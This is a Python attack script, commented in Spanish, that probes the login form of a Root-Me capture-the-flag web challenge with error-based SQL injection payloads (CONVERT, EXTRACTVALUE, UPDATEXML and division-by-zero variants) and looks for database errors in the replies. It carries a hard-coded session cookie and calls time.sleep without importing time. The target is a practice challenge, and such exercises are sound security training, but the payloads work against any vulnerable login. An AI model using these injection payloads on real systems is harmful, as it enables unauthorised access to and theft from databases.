import requests
import re

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_login_error(username, password):
    """Prueba login con Error-Based SQL Injection"""
    data = {"username": username, "password": password}
    try:
        r = requests.post(f"{URL}?action=login", data=data, cookies=COOKIE, timeout=10)
        return len(r.text), r.text
    except Exception as e:
        return 0, str(e)

print("="*70)
print("  PROBANDO ERROR-BASED SQL INJECTION EN LOGIN")
print("="*70)

# Baseline
l, content = test_login_error("admin", "test")
print(f"Baseline: {l} bytes")
print(f"Contenido: {content[:200]}...")

# Probar diferentes técnicas de Error-Based
print("\n[1] Probando errores de conversión...")
error_payloads = [
    ("admin' AND 1=CONVERT(int, @@version)-- -", "test"),
    ("admin' AND 1=CONVERT(int, user())-- -", "test"),
    ("admin' AND 1=CONVERT(int, database())-- -", "test"),
    ("admin' AND 1=CONVERT(int, VERSION())-- -", "test"),
    ("admin' AND 1=CONVERT(int, @@VERSION)-- -", "test"),
]

for username, password in error_payloads:
    l, content = test_login_error(username, password)
    
    # Buscar errores de SQL
    if "error" in content.lower() or "sql" in content.lower() or "mysql" in content.lower():
        print(f"[+] ¡ERROR ENCONTRADO! {username[:40]}")
        print(f"    Contenido: {content[:500]}...")
        break
    else:
        print(f"[-] No hay error: {username[:40]}")
    time.sleep(0.3)

# Probar con EXTRACTVALUE (MySQL)
print("\n[2] Probando EXTRACTVALUE...")
extract_payloads = [
    ("admin' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- -", "test"),
    ("admin' AND EXTRACTVALUE(1, CONCAT(0x7e, user()))-- -", "test"),
    ("admin' AND EXTRACTVALUE(1, CONCAT(0x7e, database()))-- -", "test"),
    ("admin' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))-- -", "test"),
]

for username, password in extract_payloads:
    l, content = test_login_error(username, password)
    
    if "error" in content.lower() or "sql" in content.lower():
        print(f"[+] ¡ERROR ENCONTRADO! {username[:40]}")
        print(f"    Contenido: {content[:500]}...")
        break
    else:
        print(f"[-] No hay error: {username[:40]}")
    time.sleep(0.3)

# Probar con UPDATEXML (MySQL)
print("\n[3] Probando UPDATEXML...")
update_payloads = [
    ("admin' AND UPDATEXML(1, CONCAT(0x7e, @@version), 1)-- -", "test"),
    ("admin' AND UPDATEXML(1, CONCAT(0x7e, user()), 1)-- -", "test"),
    ("admin' AND UPDATEXML(1, CONCAT(0x7e, database()), 1)-- -", "test"),
]

for username, password in update_payloads:
    l, content = test_login_error(username, password)
    
    if "error" in content.lower() or "sql" in content.lower():
        print(f"[+] ¡ERROR ENCONTRADO! {username[:40]}")
        print(f"    Contenido: {content[:500]}...")
        break
    else:
        print(f"[-] No hay error: {username[:40]}")
    time.sleep(0.3)

# Probar con división por cero
print("\n[4] Probando división por cero...")
div_payloads = [
    ("admin' AND 1/0-- -", "test"),
    ("admin' AND IF(1=1, 1/0, 1)-- -", "test"),
    ("admin' AND 1/0#", "test"),
]

for username, password in div_payloads:
    l, content = test_login_error(username, password)
    
    if "error" in content.lower() or "sql" in content.lower():
        print(f"[+] ¡ERROR ENCONTRADO! {username[:40]}")
        print(f"    Contenido: {content[:500]}...")
        break
    else:
        print(f"[-] No hay error: {username[:40]}")
    time.sleep(0.3)
